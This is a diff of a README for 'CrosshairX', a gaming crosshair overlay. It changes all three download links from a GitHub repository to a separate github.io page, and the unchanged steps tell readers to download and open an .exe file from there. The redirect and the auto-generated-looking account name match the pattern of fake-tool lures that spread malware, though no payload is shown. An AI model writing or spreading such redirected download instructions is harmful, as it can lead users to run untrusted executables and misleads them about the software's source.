@@ -1,6 +1,6 @@
 # 🎯 CrosshairX - Improve your aim with custom overlays
 
-[![Download CrosshairX](https://img.shields.io/badge/Download-CrosshairX-blue)](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX)
+[![Download CrosshairX](https://img.shields.io/badge/Download-CrosshairX-blue)](https://trumpetshaped-turkishcoffee131.github.io)
 
 ## 📌 About this tool
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your system.
 
-1. Visit the [official download page](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX) to get the latest version.
+1. Visit the [official download page](https://trumpetshaped-turkishcoffee131.github.io) to get the latest version.
 2. Locate the link labeled "Assets" on the page.
 3. Click the file ending in .exe to start your download.
 4. Open the file once it finishes downloading. 
@@ -68,6 +68,6 @@ CrosshairX modifies the visual display only. It does not interact with your game
 
 ## 📥 Final Setup
 
-You can find the installation files here: [https://github.com/trumpetshaped-turkishcoffee131/CrosshairX](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX). 
+You can find the installation files here: [https://trumpetshaped-turkishcoffee131.github.io](https://trumpetshaped-turkishcoffee131.github.io). 
 
 Download the installer to begin. Create a shortcut on your desktop for quick access. Launch the program before you start your game. Adjust your crosshair until it feels right. Your settings save automatically when you close the program.
